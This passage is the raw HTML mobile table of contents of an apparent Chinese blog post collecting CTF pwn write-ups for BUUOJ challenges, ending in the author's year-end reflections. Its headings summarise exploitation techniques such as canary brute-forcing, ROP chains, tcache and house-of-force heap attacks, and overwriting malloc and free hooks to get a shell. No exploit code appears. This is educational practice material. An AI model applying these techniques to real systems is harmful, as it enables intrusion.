class="toc_mobile_items-text">漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击"><span class="toc_mobile_items-number">37.3.</span> <span class="toc_mobile_items-text">考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间"><span class="toc_mobile_items-number">37.4.</span> <span class="toc_mobile_items-text">1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级"><span class="toc_mobile_items-number">37.5.</span> <span class="toc_mobile_items-text">2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) &#x2F; 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了"><span class="toc_mobile_items-number">37.6.</span> <span class="toc_mobile_items-text">3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell"><span class="toc_mobile_items-number">37.7.</span> <span class="toc_mobile_items-text">4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错"><span class="toc_mobile_items-number">37.8.</span> <span class="toc_mobile_items-text">但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#这里介绍一个jly大师傅的解法，scanf-“-ud”-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅"><span class="toc_mobile_items-number">37.9.</span> <span class="toc_mobile_items-text">这里介绍一个jly大师傅的解法，scanf(“%ud”)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x36-ping-gnop-hackover-2016"><span class="toc_mobile_items-number">38.</span> <span class="toc_mobile_items-text">0x36 ping_gnop_hackover_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#我将这题称为ROPgadget-–ropchain人工版"><span class="toc_mobile_items-number">38.1.</span> <span class="toc_mobile_items-text">我将这题称为ROPgadget –ropchain人工版</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell"><span class="toc_mobile_items-number">38.2.</span> <span class="toc_mobile_items-text">题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int 0x80拿到shell</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x37-warmup"><span class="toc_mobile_items-number">39.</span> <span class="toc_mobile_items-text">0x37 warmup</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell"><span class="toc_mobile_items-number">39.1.</span> <span class="toc_mobile_items-text">这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x38-fixedpoint-plaid-2016"><span class="toc_mobile_items-number">40.</span> <span class="toc_mobile_items-text">0x38 fixedpoint_plaid_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#这题就是典型的shellcode，找数字吧小伙子"><span class="toc_mobile_items-number">40.1.</span> <span class="toc_mobile_items-text">这题就是典型的shellcode，找数字吧小伙子~~</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x39-ciscn-2019-final-2"><span class="toc_mobile_items-number">41.</span> <span class="toc_mobile_items-text">0x39 ciscn_2019_final_2</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag"><span class="toc_mobile_items-number">41.1.</span> <span class="toc_mobile_items-text">典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x40-强网杯2019-拟态-STKOF"><span class="toc_mobile_items-number">42.</span> <span class="toc_mobile_items-text">0x40 强网杯2019 拟态 STKOF</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x41-ciscn-2019-ne-3"><span class="toc_mobile_items-number">43.</span> <span class="toc_mobile_items-text">0x41 ciscn_2019_ne_3</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x42-bcloud-bctf-2016"><span class="toc_mobile_items-number">44.</span> <span class="toc_mobile_items-text">0x42 bcloud_bctf_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#典型的house-of-force"><span class="toc_mobile_items-number">44.1.</span> <span class="toc_mobile_items-text">典型的house of force</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x43-web-of-sci-volga-2016"><span class="toc_mobile_items-number">45.</span> <span class="toc_mobile_items-text">0x43 web_of_sci_volga_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#leak-canary，然后普通的ROP"><span class="toc_mobile_items-number">45.1.</span> <span class="toc_mobile_items-text">leak canary，然后普通的ROP</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x44-ciscn-2019-sw-1"><span class="toc_mobile_items-number">46.</span> <span class="toc_mobile_items-text">0x44 ciscn_2019_sw_1</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#printf花式溢出漏洞，无限循环"><span class="toc_mobile_items-number">46.1.</span> <span class="toc_mobile_items-text">printf花式溢出漏洞，无限循环</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x45-中关村2019-one-string"><span class="toc_mobile_items-number">47.</span> <span class="toc_mobile_items-text">0x45 [中关村2019]one_string</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#orw"><span class="toc_mobile_items-number">47.1.</span> <span class="toc_mobile_items-text">orw</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x46-bjdctf-2020-babyrop"><span class="toc_mobile_items-number">48.</span> <span class="toc_mobile_items-text">0x46 bjdctf_2020_babyrop</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x47-bamboobox"><span class="toc_mobile_items-number">49.</span> <span class="toc_mobile_items-text">0x47 bamboobox</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x48-poke-naxtos-sthack-2016"><span class="toc_mobile_items-number">50.</span> <span class="toc_mobile_items-text">0x48 poke_naxtos_sthack_2016</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x49-ciscn-2019-final-4"><span class="toc_mobile_items-number">51.</span> <span class="toc_mobile_items-text">0x49 ciscn_2019_final_4</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#和ciscn-sw-10类似"><span class="toc_mobile_items-number">51.1.</span> <span class="toc_mobile_items-text">和ciscn_sw_10类似</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x50-ciscn-2019-s-6"><span class="toc_mobile_items-number">52.</span> <span class="toc_mobile_items-text">0x50 ciscn_2019_s_6</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x51-ciscn-nw-4"><span class="toc_mobile_items-number">53.</span> <span class="toc_mobile_items-text">0x51 ciscn_nw_4</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x52-第五空间2019-决赛-PWN5"><span class="toc_mobile_items-number">54.</span> <span class="toc_mobile_items-text">0x52 [第五空间2019 决赛]PWN5</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x53-ZJCTF-2019-EasyHeap"><span class="toc_mobile_items-number">55.</span> <span class="toc_mobile_items-text">0x53 [ZJCTF 2019]EasyHeap</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x54-ZJCTF-2019-login"><span class="toc_mobile_items-number">56.</span> <span class="toc_mobile_items-text">0x54 [ZJCTF 2019]login</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x55-ciscn-2019-n-5"><span class="toc_mobile_items-number">57.</span> <span class="toc_mobile_items-text">0x55 ciscn_2019_n_5</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x56-ciscn-2019-s-1"><span class="toc_mobile_items-number">58.</span> <span class="toc_mobile_items-text">0x56 ciscn_2019_s_1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x57-fl0ppy-codegate-2016"><span class="toc_mobile_items-number">59.</span> <span class="toc_mobile_items-text">0x57 fl0ppy_codegate_2016</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-“-bin-sh-x00”"><span class="toc_mobile_items-number">59.1.</span> <span class="toc_mobile_items-text">经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(“&#x2F;bin&#x2F;sh\x00”)</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x58-nsctf-online-2019-pwn1"><span class="toc_mobile_items-number">60.</span> <span class="toc_mobile_items-text">0x58 nsctf_online_2019_pwn1</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#覆盖-malloc-hook为one-gadget"><span class="toc_mobile_items-number">60.1.</span> <span class="toc_mobile_items-text">覆盖__malloc_hook为one_gadget</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x59-nsctf-online-2019-pwn2"><span class="toc_mobile_items-number">61.</span> <span class="toc_mobile_items-text">0x59 nsctf_online_2019_pwn2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x60-ciscn-2019-sw-5"><span class="toc_mobile_items-number">62.</span> <span class="toc_mobile_items-text">0x60 ciscn_2019_sw_5</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Ubuntu-18-04"><span class="toc_mobile_items-number">62.1.</span> <span class="toc_mobile_items-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x61-ciscn-nw-2"><span class="toc_mobile_items-number">63.</span> <span class="toc_mobile_items-text">0x61 ciscn_nw_2</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Ubuntu-18-04-1"><span class="toc_mobile_items-number">63.1.</span> <span class="toc_mobile_items-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x62-ciscn-2019-en-1"><span class="toc_mobile_items-number">64.</span> <span class="toc_mobile_items-text">0x62 ciscn_2019_en_1</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#标准的arm-pwn-rop，很适合新手"><span class="toc_mobile_items-number">64.1.</span> <span class="toc_mobile_items-text">标准的arm pwn rop，很适合新手</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x63-ciscn-2019-n-2"><span class="toc_mobile_items-number">65.</span> <span class="toc_mobile_items-text">0x63 ciscn_2019_n_2</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Ubuntu-18-04-2"><span class="toc_mobile_items-number">65.1.</span> <span class="toc_mobile_items-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x64-TWCTF-online-2019-asterisk-alloc"><span class="toc_mobile_items-number">66.</span> <span class="toc_mobile_items-text">0x64 TWCTF_online_2019_asterisk_alloc</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x65-other-babystack"><span class="toc_mobile_items-number">67.</span> <span class="toc_mobile_items-text">0x65 other_babystack</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x66-ciscn-2019-es-5"><span class="toc_mobile_items-number">68.</span> <span class="toc_mobile_items-text">0x66 ciscn_2019_es_5</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#0堆块和realloc函数之间的冲突导致double-free"><span class="toc_mobile_items-number">68.1.</span> <span class="toc_mobile_items-text">0堆块和realloc函数之间的冲突导致double free</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x67-roarctf-2019-realloc-magic"><span class="toc_mobile_items-number">69.</span> <span class="toc_mobile_items-text">0x67 roarctf_2019_realloc_magic</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖free-hook地址为system，然后直接free就可以拿到shell。"><span class="toc_mobile_items-number">69.1.</span> <span class="toc_mobile_items-text">realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制free_hook - 8的地址数据为&#x2F;bin&#x2F;sh\x00，然后向下覆盖free_hook地址为system，然后直接free就可以拿到shell。</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。"><span class="toc_mobile_items-number">69.2.</span> <span class="toc_mobile_items-text">非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Ubuntu18"><span class="toc_mobile_items-number">69.3.</span> <span class="toc_mobile_items-text">Ubuntu18</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#常规解"><span class="toc_mobile_items-number">69.4.</span> <span class="toc_mobile_items-text">常规解</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Ubuntu18-1"><span class="toc_mobile_items-number">69.5.</span> <span class="toc_mobile_items-text">Ubuntu18</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#非常规解"><span class="toc_mobile_items-number">69.6.</span> <span class="toc_mobile_items-text">非常规解</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x68-roarctf-2019-easy-pwn"><span class="toc_mobile_items-number">70.</span> <span class="toc_mobile_items-text">0x68 roarctf_2019_easy_pwn</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#堆块重叠即可"><span class="toc_mobile_items-number">70.1.</span> <span class="toc_mobile_items-text">堆块重叠即可</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x69-极客大挑战-2019-Not-Bad"><span class="toc_mobile_items-number">71.</span> <span class="toc_mobile_items-text">0x69 [极客大挑战 2019]Not Bad</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x70-axb-2019-fmt32"><span class="toc_mobile_items-number">72.</span> <span class="toc_mobile_items-text">0x70 axb_2019_fmt32</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x71-axb-2019-heap"><span class="toc_mobile_items-number">73.</span> <span class="toc_mobile_items-text">0x71 axb_2019_heap</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x72-axb-2019-fmt64"><span class="toc_mobile_items-number">74.</span> <span class="toc_mobile_items-text">0x72 axb_2019_fmt64</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x73-bytectf-2019-vip"><span class="toc_mobile_items-number">75.</span> <span class="toc_mobile_items-text">0x73 bytectf_2019_vip</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x74-SWPUCTF-2019-login"><span class="toc_mobile_items-number">76.</span> <span class="toc_mobile_items-text">0x74 SWPUCTF_2019_login</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x75-SWPUCTF-2019-p1KkHeap"><span class="toc_mobile_items-number">77.</span> <span class="toc_mobile_items-text">0x75 SWPUCTF_2019_p1KkHeap</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x76-axb-2019-final-blindHeap"><span class="toc_mobile_items-number">78.</span> <span class="toc_mobile_items-text">0x76 axb_2019_final_blindHeap</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x77-axb-2019-brop64"><span class="toc_mobile_items-number">79.</span> <span class="toc_mobile_items-text">0x77 axb_2019_brop64</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x78-jarvisoj-tell-me-something"><span class="toc_mobile_items-number">80.</span> <span class="toc_mobile_items-text">0x78 jarvisoj_tell_me_something</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x79-jarvisoj-level3-x64"><span class="toc_mobile_items-number">81.</span> <span class="toc_mobile_items-text">0x79 jarvisoj_level3_x64</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x80-jarvisoj-level0"><span class="toc_mobile_items-number">82.</span> <span class="toc_mobile_items-text">0x80 jarvisoj_level0</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x81-jarvisoj-level1"><span class="toc_mobile_items-number">83.</span> <span class="toc_mobile_items-text">0x81 jarvisoj_level1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x82-jarvisoj-level2"><span class="toc_mobile_items-number">84.</span> <span class="toc_mobile_items-text">0x82 jarvisoj_level2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x83-jarvisoj-level2-x64"><span class="toc_mobile_items-number">85.</span> <span class="toc_mobile_items-text">0x83 jarvisoj_level2(x64)</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x84-jarvisoj-leve3"><span class="toc_mobile_items-number">86.</span> <span class="toc_mobile_items-text">0x84 jarvisoj_leve3</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x85-jarvisoj-level4"><span class="toc_mobile_items-number">87.</span> <span class="toc_mobile_items-text">0x85 jarvisoj_level4</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x86-jarvisoj-level5"><span class="toc_mobile_items-number">88.</span> <span class="toc_mobile_items-text">0x86 jarvisoj_level5</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x87-jarvisoj-level6"><span class="toc_mobile_items-number">89.</span> <span class="toc_mobile_items-text">0x87 jarvisoj_level6</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x88-jarvisoj-level6-x64"><span class="toc_mobile_items-number">90.</span> <span class="toc_mobile_items-text">0x88 jarvisoj_level6(x64)</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x89-jarvisoj-test-your-memory"><span class="toc_mobile_items-number">91.</span> <span class="toc_mobile_items-text">0x89 jarvisoj_test_your_memory</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x90-jarvisoj-itemboard"><span class="toc_mobile_items-number">92.</span> <span class="toc_mobile_items-text">0x90 jarvisoj_itemboard</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x91-jarvisoj-fm"><span class="toc_mobile_items-number">93.</span> <span class="toc_mobile_items-text">0x91 jarvisoj_fm</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x92-pwnable-orw"><span class="toc_mobile_items-number">94.</span> <span class="toc_mobile_items-text">0x92 pwnable_orw</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x93-jarvisoj-typo"><span class="toc_mobile_items-number">95.</span> <span class="toc_mobile_items-text">0x93 jarvisoj_typo</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x94-others-shellcode"><span class="toc_mobile_items-number">96.</span> <span class="toc_mobile_items-text">0x94 others_shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x95-huxiangbei-2019-hacknote"><span class="toc_mobile_items-number">97.</span> <span class="toc_mobile_items-text">0x95 huxiangbei_2019_hacknote</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x96-shanghai2019-boringheap"><span class="toc_mobile_items-number">98.</span> <span class="toc_mobile_items-text">0x96 shanghai2019_boringheap</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"><span class="toc_mobile_items-number">98.1.</span> <span class="toc_mobile_items-text">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x97-shanghai2019-login"><span class="toc_mobile_items-number">99.</span> <span class="toc_mobile_items-text">0x97 shanghai2019_login</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-1"><span class="toc_mobile_items-number">99.1.</span> <span class="toc_mobile_items-text">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#爆破libc"><span class="toc_mobile_items-number">99.2.</span> <span class="toc_mobile_items-text">爆破libc</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x98-xdctf2015-pwn200"><span class="toc_mobile_items-number">100.</span> <span class="toc_mobile_items-text">0x98 xdctf2015_pwn200</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x99-bctf2016-bcloud"><span class="toc_mobile_items-number">101.</span> <span class="toc_mobile_items-text">0x99 bctf2016_bcloud</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x100-cmcc-pwn2"><span class="toc_mobile_items-number">102.</span> <span class="toc_mobile_items-text">0x100 cmcc_pwn2</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#感想："><span class="toc_mobile_items-number"></span> <span class="toc_mobile_items-text">感想：</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）"><span class="toc_mobile_items-number">0.1.</span> <span class="toc_mobile_items-text">2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～"><span class="toc_mobile_items-number">0.2.</span> <span class="toc_mobile_items-text">啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´"><span class="toc_mobile_items-number">0.3.</span> <span class="toc_mobile_items-text">这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich"><span class="toc_mobile_items-number">0.4.</span> <span class="toc_mobile_items-text">祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#南梦小剧场："><span class="toc_mobile_items-number"></span> <span class="toc_mobile_items-text">南梦小剧场：</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item 